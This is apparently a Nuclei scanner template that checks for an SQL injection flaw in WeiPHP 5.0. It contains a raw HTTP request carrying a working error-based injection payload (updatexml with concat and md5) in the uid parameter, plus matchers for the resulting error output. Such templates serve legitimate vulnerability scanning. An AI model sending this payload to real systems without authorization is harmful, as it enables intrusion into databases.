id: weiphp-sql-injection

info:
  name: WeiPHP 5.0 SQLI
  author: pikpikcu
  severity: high
  reference: https://github.com/Y4er/Y4er.com/blob/15f49973707f9d526a059470a074cb6e38a0e1ba/content/post/weiphp-exp-sql.md
  tags: weiphp,sql

requests:
  - raw:
      - |
        GET /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=) and updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: id,en-US;q=0.7,en;q=0.3
        DNT: 1
        Connection: close

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "52c69e3a57331081823331c4e69d3f2"
          - "data_auth_key"
        part: body

      - type: status
        status:
          - 500
